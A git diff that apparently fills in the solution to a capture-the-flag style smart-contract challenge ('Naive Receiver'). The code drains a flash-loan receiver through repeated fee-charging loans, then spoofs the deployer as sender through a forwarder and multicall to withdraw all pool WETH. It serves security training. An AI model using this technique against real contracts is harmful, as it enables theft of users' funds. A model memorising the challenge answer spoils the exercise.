@@ -77,7 +77,33 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        for (uint256 i = 0; i < 10; i++) {
+            pool.flashLoan(receiver, address(weth), 1 ether, "");
+        }
+
+        bytes[] memory data = new bytes[](1);
+        bytes memory withdraw = abi.encodePacked(
+            abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(player))), deployer
+        );
+        data[0] = withdraw;
+
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 100000000,
+            nonce: 0,
+            data: abi.encodeCall(pool.multicall, (data)),
+            deadline: block.timestamp + 1000
+        });
+
+        bytes32 digest =
+            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        forwarder.execute(request, signature);
+        weth.transfer(recovery, weth.balanceOf(address(player)));
     }
 
     /**
